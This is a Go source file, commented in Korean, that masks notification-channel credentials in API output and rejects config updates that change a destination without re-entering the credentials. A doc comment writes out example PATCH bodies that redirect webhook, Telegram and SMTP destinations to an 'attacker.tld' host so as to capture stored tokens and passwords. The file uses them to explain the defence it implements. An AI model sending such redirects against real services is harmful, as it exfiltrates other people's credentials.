package notify

import (
	"encoding/json"
	"fmt"
	"strings"
)

// MaskedPrefix는 마스킹 값 접두사다. API가 자격 증명을 반환할 때 실제 내용 대신 사용하며
// 갱신 API가 이 접두사 값을 받으면 DB 원본을 유지한다.
//
// 빈 문자열이나 고정 상수 대신 접두사를 쓰면 MaskedValue처럼 일부 식별 정보를
// 붙여 키를 다시 입력하지 않고 어떤 봇인지 구별하게 할 수 있다.
const MaskedPrefix = "__masked__"

// MaskedValue가 생성하는 마스킹 값:
//
// "__masked__"              원본이 너무 짧아 식별 정보를 제공하지 않음.
// "__masked__:…ab12cd"      원본 끝 6자리로 식별 정보 제공.
//
// 끝 6자리만 공개하는 것은 Webhook 식별 정보(WeCom key, Feishu 봇 id)가
// 마지막에 있고 앞부분은 봇마다 같아 식별 가치가 없기 때문이다. 끝 6자리로
// 자격 증명을 복원할 수는 없지만 설정자가 그룹을 알아볼 수 있다.
func MaskedValue(secret string) string {
	if len(secret) <= 6 {
		return MaskedPrefix
	}
	return MaskedPrefix + ":…" + secret[len(secret)-6:]
}

// IsMasked는 응답 후 수정되지 않은 마스킹 값인지 반환한다.
func IsMasked(v string) bool { return strings.HasPrefix(v, MaskedPrefix) }

// MaskConfig는 채널 자격 증명 필드를 마스킹한 설정 복사본을 반환한다.
//
// 알 수 없는 채널은 원본 대신 빈 map을 반환한다. UI에 설정 사용 불가를 표시하더라도
// 유형을 모르는 상태에서 자격 증명 가능성이 있는 원본 전체를 반환하지 않는다.
// 일반 필드는 유지해 UI가 정상 표시할 수 있게 한다.
func MaskConfig(kind string, cfg map[string]any) map[string]any {
	channel, ok := Get(kind)
	if !ok {
		return map[string]any{}
	}
	secrets := map[string]bool{}
	for _, k := range channel.SecretKeys() {
		secrets[k] = true
	}
	out := make(map[string]any, len(cfg))
	for k, v := range cfg {
		if !secrets[k] {
			out[k] = v
			continue
		}
		// headers 같은 중첩 구조는 전체를 자격 증명 하나로 처리한다. 하위 key별로 판단하려면
		// 채널마다 자격 증명 하위 key 규칙이 필요해 복잡도가 이득보다 크다.
		if s, ok := v.(string); ok {
			out[k] = MaskedValue(s)
			continue
		}
		out[k] = MaskedPrefix
	}
	return out
}

// ErrDestinationChangedWithoutCredentials는 목적지가 바뀌었으나 호출자가 자격 증명
// 필드를 명시하지 않았음을 뜻한다. 조용히 허용/제거하지 않는 이유는 PrepareConfigUpdate 참조.
type ErrDestinationChangedWithoutCredentials struct {
	Changed []string // 바뀐 목적지 key.
	Missing []string // 명시하지 않은 자격 증명 key.
}

func (e *ErrDestinationChangedWithoutCredentials) Error() string {
	return "대상 주소(" + strings.Join(e.Changed, ", ") + ")가 변경되었습니다. 자격 증명 필드(" +
		strings.Join(e.Missing, ", ") + ")를 함께 다시 입력하세요: 새 값을 넣거나, 비워 두어 더는 자격 증명이 필요 없음을 표시하세요. " +
		"기존 자격 증명은 이전 주소에만 유효하므로, 그대로 사용하면 새 주소에 넘겨주는 셈입니다."
}

// PrepareConfigUpdate는 채널 설정을 병합하고 보안상 민감한 목적지 변경을 처리한다.
//
// 채널 갱신에서 단순 MergeConfig를 대체해 다음과 같은 확인된 경로를 막는다.
// 목적지와 자격 증명은 독립 필드인데 MergeConfig는 언급하지 않은 key의 원본을 유지한다.
// 따라서 채널 PATCH 권한이 있는 사람이 주소만 바꾸고 자격 증명을 언급하지 않으면
// DB의 실제 자격 증명을 자신이 제어하는 endpoint로 발송하게 할 수 있다.
//
// webhook {config:{url:"https://attacker.tld"}} → 기존 Authorization 헤더가 외부로 발송됨.
// telegram {config:{base_url:"https://attacker.tld"}} → /bot<실제Token>/sendMessage
// email {config:{host:"smtp.attacker.tld"}} → STARTTLS 후 사용자 이름/비밀번호 전달.
//
// 리디렉션 없이 조용히 발생하므로 호스트 간 이동 차단으로 막지 못하며
// 브라우저에 자격 증명을 표시하지 않는 마스킹의 목적도 무너뜨린다.
//
// 목적지 key 하나라도 새 값으로 바뀌면 모든 자격 증명 key를 명시해야 한다.
//   - 새 값 → 새 값 사용.
//   - 명시적 빈 문자열 → 해당 필드 자격 증명 제거.
//   - 원본 마스킹 값 또는 key 생략 → 거부.
//
// 마스킹 값은 이전 자격 증명 재사용을 뜻하지만 이전 주소에만 유효하므로 거부한다.
// 자동 제거도 하지 않는다. 선택적 자격 증명(webhook headers/email password)을
// 조용히 지우면 인증이 없어져도 API 200이 반환되어 오류보다 원인 파악이 어렵다.
// 따라서 사용자가 다시 입력하게 한다.
func PrepareConfigUpdate(kind string, stored, incoming map[string]any) (map[string]any, error) {
	channel, ok := Get(kind)
	if !ok {
		return nil, fmt.Errorf("등록되지 않은 채널 유형입니다: %q", kind)
	}
	secrets := channel.SecretKeys()
	destinations := channel.DestinationKeys()

	// 문자열 아닌 자격 증명(webhook headers 객체 등) 내부의 마스킹 리터럴은
	// 원본 유지 센티널을 구조 내부에 넣었다는 의미다. MergeConfig는 접두사가 있는
	// 문자열만 마스킹으로 보므로 이를 일반 객체로 저장하면 실제 DB에
	// "__masked__"가 남아 인증이 오류 안내 없이 실패한다. 따라서 거부한다.
	//
	// 이 검사는 주소 미변경 시 조기 반환보다 먼저 수행해야 한다.
	// 뒤에 두면 주소 변경 경로에만 적용된다(초기 구현의 실수를 테스트로 발견함).
	if err := rejectMaskedInContainers(incoming, secrets); err != nil {
		return nil, err
	}

	// 실제로 바뀐 목적지 key를 찾는다. 마스킹 값은 미변경과 같다.
	var changed []string
	for _, key := range destinations {
		raw, present := incoming[key]
		if !present {
			continue
		}
		s, isStr := raw.(string)
		if isStr && IsMasked(s) {
			continue
		}
		if !sameConfigValue(raw, stored[key]) {
			changed = append(changed, key)
		}
	}
	if len(changed) == 0 {
		// 주소가 같으면 일반 병합: 마스킹=원본 유지, 빈 문자열=제거, 나머지=덮어쓰기.
		return MergeConfig(stored, incoming), nil
	}

	// 주소가 바뀌면 각 자격 증명 key를 명시하도록 요구한다.
	var missing []string
	for _, key := range secrets {
		raw, present := incoming[key]
		if !present {
			missing = append(missing, key)
			continue
		}
		if s, isStr := raw.(string); isStr && IsMasked(s) {
			missing = append(missing, key)
		}
	}
	if len(missing) > 0 {
		return nil, &ErrDestinationChangedWithoutCredentials{Changed: changed, Missing: missing}
	}
	return MergeConfig(stored, incoming), nil
}

// rejectMaskedInContainers는 문자열 아닌 구조 안의 마스킹 센티널을 거부한다.
//
// 마스킹은 전체 값이 문자열이어야 한다. webhook headers 같은 객체는
// 전체를 "__masked__" 문자열로 마스킹하거나 전체를 제출해야 한다. 내부 센티널은
// 원본 유지를 표현하지 못하고 실제 값으로 DB에 저장된다.
func rejectMaskedInContainers(incoming map[string]any, secretKeys []string) error {
	for _, key := range secretKeys {
		raw, present := incoming[key]
		if !present {
			continue
		}
		if _, isStr := raw.(string); isStr {
			continue
		}
		encoded, err := json.Marshal(raw)
		if err != nil {
			continue
		}
		if strings.Contains(string(encoded), MaskedPrefix) {
			return fmt.Errorf("%s 필드의 내용에 마스킹 표시(%q)가 들어 있습니다. 이 필드는 전체를 비워 두어 기존 값을 유지하거나 전체를 새 값으로 제출해야 하며, 구조체 내부에 마스킹 표시를 끼워 넣을 수 없습니다",
				key, MaskedPrefix)
		}
	}
	return nil
}

// sameConfigValue는 두 설정값의 동등성을 판단한다. JSON 직렬화 비교는 프런트엔드
// number와 DB float64처럼 직접 ==로 비교하면 다르게 보이는 유형 차이도 처리한다.
//
// 빈 값은 정규화 후 비교해야 한다. 이 모델에서 빈 문자열과 key 부재는 같은 상태다.
// MergeConfig가 빈 문자열을 명시적 삭제로 보기 때문이다. 정규화하지 않으면
// 항상 빈 선택적 목적지(유일한 예는 빈 값이면 공식 주소를 쓰는 Telegram base_url)가
// 다음 경로로 처리된다.
//
// 생성 시 base_url:"" 저장 → 첫 저장에서 MergeConfig가 key 제거.
// → 다음 저장에서 incoming은 "", stored는 key 없음이므로 주소 변경으로 오판.
// → 자격 증명이 마스킹 값이라 목적지 변경 시 자격 증명 재입력 400 오류.
//
// 사용자는 아무것도 바꾸지 않았어도 Bot Token을 다시 입력하기 전에는 저장할 수 없게 된다.
func sameConfigValue(a, b any) bool {
	if isBlankConfigValue(a) && isBlankConfigValue(b) {
		return true
	}
	ra, errA := json.Marshal(a)
	rb, errB := json.Marshal(b)
	if errA != nil || errB != nil {
		return false
	}
	return string(ra) == string(rb)
}

// isBlankConfigValue는 설정값이 비어 있는지 판단한다.
// MergeConfig의 지우기 기준(strings.TrimSpace(s) == "")과 같아야
// 한쪽은 삭제, 다른 쪽은 값 있음으로 보는 불일치를 방지한다.
func isBlankConfigValue(v any) bool {
	if v == nil {
		return true
	}
	s, ok := v.(string)
	return ok && strings.TrimSpace(s) == ""
}

// MergeConfig는 채널 갱신을 위해 incoming을 stored에 병합한다.
//
// 규칙:
//   - incoming의 마스킹 값 → stored 원본 유지(사용자 미변경).
//   - incoming의 빈 문자열 → 명시적 삭제.
//   - 나머지 key → incoming으로 덮어쓰기.
//   - stored에만 있는 key → 유지(부분 갱신).
//
// 양식은 미입력 필드를 빈 문자열로 제출하므로 빈 값의 의미를 명확히 해야 한다.
// 이를 일반 값으로 저장하면 원본 유지용 빈 필드도 실제로 지워질 수 있다.
// 여기서는 잘못된 필드를 지우는 다른 표현이 없으므로 명시적 삭제를 선택한다.
// 필드 자체를 빼면 미제공과 빈 값 제공을 구별할 수 있지만 UI는 그 차이를 사용하지 않는다.
func MergeConfig(stored, incoming map[string]any) map[string]any {
	out := make(map[string]any, len(stored)+len(incoming))
	for k, v := range stored {
		out[k] = v
	}
	for k, v := range incoming {
		if s, ok := v.(string); ok {
			if IsMasked(s) {
				continue // 마스킹 값=미변경. stored 유지.
			}
			if strings.TrimSpace(s) == "" {
				delete(out, k)
				continue
			}
			out[k] = s
			continue
		}
		out[k] = v
	}
	return out
}
